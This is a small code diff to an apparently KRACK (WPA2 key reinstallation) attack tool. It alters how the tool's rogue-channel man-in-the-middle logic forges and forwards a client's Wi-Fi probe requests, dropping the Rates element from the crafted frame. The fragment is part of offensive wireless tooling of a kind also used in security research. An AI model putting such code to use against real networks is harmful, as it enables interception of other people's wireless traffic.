@@ -489,10 +489,10 @@ class KRAckAttack():
 			elif p.addr2 == self.clientmac:
 				if (p.haslayer(Dot11ProbeReq)):
 					essid = Dot11Elt(ID='SSID', info=self.netconfig.ssid)
-					rates  = Dot11Elt(ID='Rates',info=self.rates)
+					# rates  = Dot11Elt(ID='Rates',info=self.rates)
 					dsset = Dot11Elt(ID='DSset',info=bytes([self.netconfig.real_channel]))
 					dot11 =  Dot11(type=0, subtype=4, addr1=self.apmac, addr2=self.clientmac, addr3=self.apmac)
-					np = dot11/Dot11ProbeReq()/essid/rates/dsset
+					np = dot11/Dot11ProbeReq()/essid/dsset
 					self.sock_real.send(np, True, self.netconfig.real_channel)
 				# print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
 
